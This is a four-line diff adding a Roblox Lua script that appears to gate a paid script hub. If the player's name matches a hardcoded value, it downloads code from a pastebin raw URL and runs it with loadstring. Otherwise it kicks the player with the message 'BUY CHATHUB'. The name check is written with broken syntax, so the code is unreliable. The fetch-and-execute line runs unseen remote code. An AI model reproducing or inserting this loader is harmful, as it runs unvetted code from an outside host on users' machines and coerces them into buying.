@@ -1,0 +1,4 @@
+if game.Player.LocalPlayer.Name == {JoshIsMadAtAmazonn} then
+loadstring(game:HttpGet("https://pastebin.com/raw/ZsVezxbm", true))()
+    else
+    game.Players:WaitForChild("LocalPlayer"):Kick("BUY CHATHUB")
